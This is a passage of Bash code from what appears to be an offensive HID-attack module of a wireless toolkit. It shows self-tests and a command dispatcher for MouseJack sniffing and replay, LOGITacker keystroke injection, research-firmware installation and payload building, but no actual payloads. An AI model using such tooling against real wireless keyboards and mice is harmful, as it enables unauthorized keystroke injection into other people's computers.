fi

    # 3. Capability / status contracts the GUI parses.
    chk status-keys "$(hid_cli_status_tsv | awk -F'\t' '{print $1}' | tr '\n' ',')" \
        "dongle,tty,state_dir,loot_dir,python2,python3_usb,shim,research_fw,logitacker,"
    out=$(hid_cli_status_tsv)
    chk status-dongle-token "$(printf '%s\n' "$out" | awk -F'\t' '$1=="dongle"{print $2}' | \
        grep -cE '^(none|crazyradio_stock|crazyradio_research|nrf52840_blank|logitacker)$')" "1"
    chk status-flag-values "$(printf '%s\n' "$out" | awk -F'\t' '$1=="python2"||$1=="python3_usb"{print $2}' | \
        grep -cE '^(yes|no)$')" "2"
    chk status-shim-path "$(printf '%s\n' "$out" | awk -F'\t' '$1=="shim"{print $2}')" \
        "$HID_LOOT/mj_nrf24.py"
    # No lsusb on PATH must degrade to "none", not to a bogus dongle.
    chk detect-without-tools "$(PATH="$d/bin" hid_detect_dongle)" "none"

    printf '%s\n' 'PLACEHOLDER' > "$d/payloads/p1.txt"
    printf '%s\n' 'PLACEHOLDER2' > "$d/payloads/p2.mj"
    out=$(HID_PAYLOADS="$d/payloads" hid_cli_list_payloads_tsv)
    chk payloads-rows "$(printf '%s\n' "$out" | grep -c .)" "2"
    chk payloads-name "$(printf '%s\n' "$out" | awk -F'\t' 'NR==1{print $1}')" "p1.txt"
    chk payloads-size "$(printf '%s\n' "$out" | awk -F'\t' 'NR==1{print $2}')" "12"

    # 4. Argument validation must fail before any device work.
    chk replay-no-args-rc "$(hid_mj_replay '' '' >/dev/null 2>&1; echo $?)" "2"
    out=$(hid_lt_serial_write /dev/does-not-exist "x" 2>&1); rc=$?
    chk serial-missing-tty-rc  "$rc" "1"
    chk serial-missing-tty-msg "$(printf '%s\n' "$out" | grep -c 'no tty /dev/does-not-exist')" "1"
    chk drain-missing-tty-rc   "$(hid_lt_serial_drain /dev/does-not-exist >/dev/null 2>&1; echo $?)" "1"

    # 5. No `read -rp` may run unguarded (convention #4): a GUI, pkexec or
    #    piped caller must get a clear error, never a prompt that blocks.
    #    WIFISTING_CLI is what the module's own dispatch sets.
    out=$( WIFISTING_CLI=1 hid_mj_sniff "" 2>&1 ); rc=$?
    chk prompt-mjsniff-cli-rc  "$rc" "1"
    chk prompt-mjsniff-cli-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*cannot prompt in non-interactive mode')" "1"
    out=$( WIFISTING_CLI=1 hid_build_payload "" 2>&1 ); rc=$?
    chk prompt-payload-cli-rc  "$rc" "1"
    chk prompt-payload-cli-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*cannot prompt in non-interactive mode')" "1"
    out=$( WIFISTING_CLI=1 hid_lt_inject 2>&1 ); rc=$?
    chk prompt-ltinject-cli-rc  "$rc" "1"
    chk prompt-ltinject-cli-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*cannot prompt in non-interactive mode')" "1"
    # ... the same guard fires on a non-tty stdin with no CLI flag set
    out=$( WIFISTING_CLI= hid_mj_sniff "" </dev/null 2>&1 ); rc=$?
    chk prompt-mjsniff-notty-rc  "$rc" "1"
    chk prompt-mjsniff-notty-msg "$(printf '%s\n' "$out" | grep -c 'ERROR.*cannot prompt in non-interactive mode')" "1"
    # ... the ${EDITOR:-nano} spawn must be skipped too, but the payload is
    #     still built (that is the verb's actual job).
    rm -f "$d/payloads/editme.txt"
    out=$( WIFISTING_CLI=1 EDITOR=/nonexistent/editor \
           HID_PAYLOADS="$d/payloads" hid_build_payload editme 2>&1 ); rc=$?
    chk prompt-editor-skipped-rc  "$rc" "0"
    chk prompt-editor-skipped-note "$(printf '%s\n' "$out" | grep -c 'skipping .*EDITOR')" "1"
    chk prompt-editor-payload-built "$([[ -s "$d/payloads/editme.txt" ]] && echo yes || echo no)" "yes"
    chk prompt-guard-fn-off "$(WIFISTING_CLI=1 hid_can_prompt >/dev/null 2>&1; echo $?)" "1"

    rm -rf "$d"
    printf 'RESULT\t%s\n' "$([[ $bad -eq 0 ]] && echo PASS || echo "FAIL($bad)")"
    return $(( bad > 0 ))
}

# ═══════════════════════════════════════════════════════════════════
#  dispatch
# ═══════════════════════════════════════════════════════════════════

hid_cli_main() {
    local cmd="${1:-}"
    (($# > 0)) && shift
    case "$cmd" in
        --status-tsv)         hid_cli_status_tsv ;;
        --detect-tsv)         hid_cli_detect_tsv ;;
        --check-deps)         hid_cli_check_deps ;;
        --list-payloads-tsv)  hid_cli_list_payloads_tsv ;;
        --write-shim)         hid_write_py3_shim ;;
        --mj-scan)            hid_mj_scan "$@" ;;
        --mj-sniff)           hid_mj_sniff "$@" ;;
        --mj-replay)          hid_mj_replay "$@" ;;
        --install-nrf-research) hid_install_nrf_research ;;
        --install-logitacker) hid_install_logitacker ;;
        --payload-name)       hid_build_payload "$@" ;;
        --selftest)           hid_selftest ;;
        --info|--help|-h)     hid_cli_info ;;
        *)
            hid_cli_info >&2
            return 2 ;;
    esac
}

if [[ "${BASH_SOURCE[0]}" == "$0" ]]; then
    set -o pipefail
    WIFISTING_CLI=1
    command -v banner >/dev/null 2>&1 || banner() { :; }
    declare -F info   >/dev/null 2>&1 || info()   { printf '[info] %s\n' "$*" >&2; }
    command -v warn   >/dev/null 2>&1 || warn()   { printf '[warn] %s\n' "$*" >&2; }
    command -v err    >/dev/null 2>&1 || err()    { printf '[err]  %s\n' "$*" >&2; }
    command -v ok     >/dev/null 2>&1 || ok()     { printf '[ok]   %s\n' "$*" >&2; }
    hid_cli_main "$@"
fi
